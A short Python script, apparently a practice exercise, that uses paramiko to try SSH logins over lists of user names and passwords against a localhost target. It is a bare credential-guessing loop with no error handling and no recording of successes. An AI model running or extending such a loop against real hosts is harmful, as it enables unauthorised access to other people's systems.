from paramiko import SSHClient

client = SSHClient()
target_ip = "127.0.0.1"
user_names = ["guest"]
passwords = ["q1w2e3r4"]

for user_name in user_names:
    for password in passwords:
        client.connect(target_ip, username=user_name, password=password)
        client.close()